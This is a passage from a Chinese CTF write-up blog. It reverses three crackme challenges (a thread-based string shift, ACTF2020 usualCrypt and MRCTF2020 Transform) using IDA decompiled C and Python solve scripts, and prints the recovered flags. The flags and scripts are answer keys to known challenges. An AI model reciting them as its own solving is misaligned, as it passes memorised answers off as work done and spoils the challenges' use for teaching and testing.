class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然创建了两个线程，但是第二线程似乎只是为了Sleep而创建的，所以只有<code>StartAddress</code>函数是具有功能的。深入跟进该函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// positive sp value has been detected, the output may be wrong!</span><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">sub_411940</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>result<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+D3h] [ebp-5h]</span>    v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>v3 <span class="token operator">&lt;</span> <span class="token number">65</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token number">97</span> <span class="token operator">||</span> v3 <span class="token operator">></span> <span class="token number">122</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        result <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> off_418000<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然最上面提示了堆栈不平衡，但是ida7.5依然分析出了该功能的c代码。上面的a2对应的就是那个一直在自减一的<code>dword_418008</code>，表示字符串的窗口挪动？而后面的那个线程似乎只做了字符串窗口移动的动作。这个应该是一个从后向前推导的过程，但是简单分析了一下，这样似乎不行，看了别人的wp，发现应该是后面还有一位的，这里进行验证的是29位，但是其实进行加密的是30位，这样就满足了，由此得出逆向的python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token string">''</span>off_418000 <span class="token operator">=</span> <span class="token string">'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'</span>off_418004 <span class="token operator">=</span> <span class="token string">'TOiZiZtOrYaToUwPnToBsOaOapsySy'</span>  <span class="token comment"># 在从ida得来的字符串的最后加上一位(随意的字符)，经测试，只有在第三十位字符是y的情况下得出的flag才是正确的</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>off_418004<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">continue</span>    tmp <span class="token operator">=</span> off_418000<span class="token punctuation">.</span>index<span class="token punctuation">(</span>off_418004<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 用tmp的值代表检验字符串在加密表字符串的位置(下标)</span>    <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">38</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>tmp <span class="token operator">+</span> <span class="token number">96</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># ThisisthreadofwindowshahaIsESE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一位是y时得到的flag才是正确的。。。</p><p>另外加密的时候<code>*(_BYTE *)(a2 + a1)</code>代表的是地址，所以后面的<code>*(char *)(a2 + a1)</code>应该也是地址类似的东西，在数组里面也只有下标了，总之这道题做得挺蒙的。。。</p><h3 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h3><p><strong>TAG:换表base64、大小写互相转换</strong></p><p>查壳无壳</p><p><img src="/2021/05/28/CTF/image-20210607180229271.png" alt></p><p>直接先使用ida32打开看一看</p><p><img src="/2021/05/28/CTF/image-20210607180359872.png" alt></p><p>找到关键的字符串，一路跟踪进去发现关键函数，内容如下(其实就是逆出来的main函数)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-74h] BYREF</span>  __int16 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-68h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+16h] [ebp-66h]</span>  <span class="token keyword">char</span> v8<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-64h] BYREF</span>  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_40E140<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">sub_401080</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> v3<span class="token punctuation">)</span> <span class="token operator">==</span> byte_40E0E4<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>v3 <span class="token operator">></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">goto</span> LABEL_6<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aError<span class="token punctuation">)</span><span class="token punctuation">;</span>LABEL_6<span class="token operator">:</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token function">strlen</span><span class="token punctuation">(</span>byte_40E0E4<span class="token punctuation">)</span> <span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyYes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    result <span class="token operator">=</span> <span class="token function">sub_403CF8</span><span class="token punctuation">(</span>aAreYouHappyNo<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看前面的这个函数</p><p><img src="/2021/05/28/CTF/image-20210607192629739.png" alt></p><p>跟进函数内部，很容易发现这就是一个换表的base64，原始的表为</p><pre class="line-numbers language-none"><code class="language-none">ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到引用这串字符串的，有个函数专门用来换表，函数的内容如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// cl</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> result <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> result <span class="token operator">&lt;</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>result <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v1 <span class="token operator">=</span> byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_40E0AA<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_40E0A0<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到上面<code>byte_40E0A0</code>和<code>byte_40E0A0</code>交换位置，ez，意思就是对原始的表从第六位开始和原始的表的第15位开始后的9位进行调换位置即可。</p><p>然后就是最后的这个了，一般情况下进行base的时候应该是没有这个的，这个逆出了这个说明有问题</p><p><img src="/2021/05/28/CTF/image-20210607194310914.png" alt></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">sub_401030</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// al</span>  v1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v2 <span class="token operator">=</span> a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'z'</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> v2 <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token punctuation">)</span>          <span class="token keyword">goto</span> LABEL_9<span class="token punctuation">;</span>        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>        <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      a1<span class="token punctuation">[</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>LABEL_9<span class="token operator">:</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token operator">++</span><span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大小写相互转换，这里的逻辑大概清晰了，我们先找到加密后的flag如下</p><p><img src="/2021/05/28/CTF/image-20210607192901280.png" alt></p><p>这个应该就是flag转换后的样子，</p><pre class="line-numbers language-none"><code class="language-none">zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先把这个字符串大小写互换之后进行base64的换标解密，写出完整版的poc如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string<span class="token keyword">import</span> base64s <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>enc_flag <span class="token operator">=</span> <span class="token string">'zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9'</span>encflag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> enc_flag<span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> i<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        encflag <span class="token operator">+=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>encflag<span class="token punctuation">)</span><span class="token comment"># 换表base64</span>ss <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">]</span>table<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>ss<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>translate<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;bAse64_h2s_a_Surprise&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>里面的换表的结果与原始表的排列是有关的，仔细看看那两个字符数组<code>byte_40E0A0</code>和<code>byte_40E0A0</code>就明白了。</p><h3 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h3><p><strong>TAG:简单异或</strong></p><p>首先是个exe可执行文件，先查一下是不是带壳的。</p><p><img src="/2021/05/28/CTF/image-20210608074332817.png" alt></p><p>64位无壳程序</p><p>拖入ida64位，找到关键函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-70h] BYREF</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8Ch] [rbp-4h]</span>  <span class="token function">sub_402230</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Give me your code:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E5F0</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">33</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Str<span class="token punctuation">[</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    byte_414040<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token function">LOBYTE</span><span class="token punctuation">(</span>dword_40F040<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">32</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_40F0E0<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_414040<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Wrong!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Right!Good Job!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_40E640</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: %s\n"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到关键的数据有两个</p><pre class="line-numbers language-none"><code class="language-none">dword_40F040 &#x3D; [0x9, 0x0A, 0x0F, 0x17, 0x7, 0x18, 0x0C, 0x6, 0x1, 0x10, 0x3, 0x11, 0x20, 0x1D, 0x0B, 0x1E, 0x1B, 0x16,                0x4, 0x0D, 0x13, 0x14, 0x15, 0x2, 0x19, 0x5, 0x1F, 0x8, 0x12, 0x1A, 0x1C, 0x0E, 0x00]byte_40F0E0 &#x3D; [0x67, 0x79, 0x7B, 0x7F, 0x75, 0x2B, 0x3C, 0x52, 0x53, 0x79, 0x57, 0x5E, 0x5D, 0x42, 0x7B, 0x2D, 0x2A,               0x66, 0x42, 0x7E, 0x4C, 0x57, 0x79, 0x41, 0x6B, 0x7E, 0x65, 0x3C, 0x5C, 0x45, 0x6F, 0x62, 0x4D]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>Str</code>是flag，这里先将<code>dword_40F040</code>作为flag字符串的下标，然后<code>byte_40F0E0 = flag[dword_40F040] ^ dword_40F040</code></p><p>意思就是这么个意思啦，直接逆，由异或的特性易知<code>flag[dword_40F040] = byte_40F0E0 ^ dword_40F040</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dword_40F040 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x9</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span>                <span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x5</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span>byte_40F0E0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token 